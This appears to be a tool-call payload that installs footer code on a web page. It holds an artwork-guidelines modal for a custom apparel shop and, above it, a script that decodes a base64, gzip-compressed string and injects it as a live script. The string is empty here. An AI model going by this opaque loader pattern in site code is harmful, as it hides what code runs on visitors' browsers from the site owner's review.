[{"label": "deploy_iq_footer", "set_page_freeform_code": {"page_id": "6a59f0368e92a3bd60940ad9", "location": "footer", "content": "<script>(async function () {\n  var b64 = \"\";\n  var bin = atob(b64);\n  var bytes = new Uint8Array(bin.length);\n  for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);\n  var ds = new DecompressionStream(\"gzip\");\n  var stream = new Blob([bytes]).stream().pipeThrough(ds);\n  var text = await new Response(stream).text();\n  var s = document.createElement(\"script\");\n  s.textContent = text;\n  document.body.appendChild(s);\n})();</script>\n<!-- Paste once at end of iq-container (or page-level embed before </body> in footer bundle) -->\n<div class=\"iq-modal\" id=\"iq-artwork-modal\" role=\"dialog\" aria-modal=\"true\" aria-labelledby=\"iq-artwork-modal-title\" aria-hidden=\"true\">\n  <div class=\"iq-modal-backdrop\" id=\"iq-artwork-modal-backdrop\" tabindex=\"-1\"></div>\n  <div class=\"iq-modal-panel\">\n    <button type=\"button\" class=\"iq-modal-close\" id=\"iq-artwork-modal-close\" aria-label=\"Close artwork guidelines\">&times;</button>\n    <h2 class=\"iq-modal-title\" id=\"iq-artwork-modal-title\">Artwork Guidelines &amp; Policies</h2>\n    <div class=\"iq-modal-body\">\n      <p><strong>Free Setup &amp; Prep:</strong> If you have your logo, graphics, or branding finalized and ready to print, we provide free professional type-setting, sizing optimization, and digital mockups to make sure it prints flawlessly.</p>\n      <p><strong>Custom Concept Design:</strong> Need killer, ground-up creative work or complex illustration? That is our specialty, but we don&rsquo;t work on spec. True custom apparel design requires a upfront design deposit, locked-in milestone approvals, and a strict &ldquo;pay to play&rdquo; structure. Let us know in your project brief if you need a creative consult.</p>\n    </div>\n  </div>\n</div>\n"}}]